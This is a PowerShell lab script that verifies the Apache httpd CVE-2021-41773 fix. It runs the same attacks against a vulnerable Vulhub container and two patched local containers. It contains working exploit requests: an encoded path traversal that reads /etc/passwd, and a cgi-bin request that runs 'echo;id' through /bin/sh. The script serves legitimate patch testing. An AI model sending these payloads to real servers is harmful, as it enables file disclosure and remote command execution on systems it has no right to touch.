$ErrorActionPreference = "Stop"

$repoRoot = Split-Path $PSScriptRoot -Parent
$vulhubRoot = Join-Path $repoRoot "vulhub"

function Wait-Http([string]$Url, [int]$Attempts = 30) {
    for ($i = 0; $i -lt $Attempts; $i++) {
        Start-Sleep -Seconds 1
        $code = curl.exe -s -o NUL -w "%{http_code}" $Url
        if ($code -and $code -ne "000") { return $code }
    }
    return "000"
}

function Test-Target([string]$Name, [string]$BaseUrl) {
    $traversal = "$BaseUrl/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
    $rce = "$BaseUrl/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"

    $rootCode = Wait-Http "$BaseUrl/"
    $body = curl.exe -s --path-as-is $traversal
    $code = curl.exe -s -o NUL -w "%{http_code}" --path-as-is $traversal
    $rceBody = curl.exe -s --path-as-is --data "echo;id" $rce

    [pscustomobject]@{
        Environment = $Name
        RootStatus = $rootCode
        TraversalStatus = $code
        PasswdDisclosed = [bool]($body -match "root:x:0:0")
        CommandExecuted = [bool]($rceBody -match "uid=")
    }
}

if (-not (Test-Path (Join-Path $vulhubRoot "httpd/CVE-2021-41773"))) {
    git clone --depth 1 --filter=blob:none --sparse `
        https://github.com/vulhub/vulhub.git $vulhubRoot
    git -C $vulhubRoot sparse-checkout set httpd/CVE-2021-41773
}

Push-Location (Join-Path $vulhubRoot "httpd/CVE-2021-41773")
try { docker compose up -d --build } finally { Pop-Location }

Push-Location (Join-Path $PSScriptRoot "fixed-version-only")
try { docker compose up -d --build } finally { Pop-Location }

Push-Location (Join-Path $PSScriptRoot "fixed-hardened")
try { docker compose up -d --build } finally { Pop-Location }

$results = @(
    Test-Target "Vulhub 2.4.49" "http://localhost:8080"
    Test-Target "2.4.51 permissive" "http://localhost:8081"
    Test-Target "2.4.51 hardened" "http://localhost:8082"
)

$results | Format-Table -AutoSize

$vuln = $results | Where-Object Environment -eq "Vulhub 2.4.49"
$fixed = $results | Where-Object Environment -eq "2.4.51 permissive"
$hardened = $results | Where-Object Environment -eq "2.4.51 hardened"

if ($vuln.PasswdDisclosed -and -not $fixed.PasswdDisclosed -and
    -not $hardened.PasswdDisclosed -and $hardened.RootStatus -eq "200") {
    Write-Host "`n[+] Verification passed: vulnerable version leaks data;" -ForegroundColor Green
    Write-Host "    patched versions block traversal and normal service still works." -ForegroundColor Green
    exit 0
}

Write-Host "`n[-] Verification failed. Inspect the table and container logs." -ForegroundColor Red
exit 1
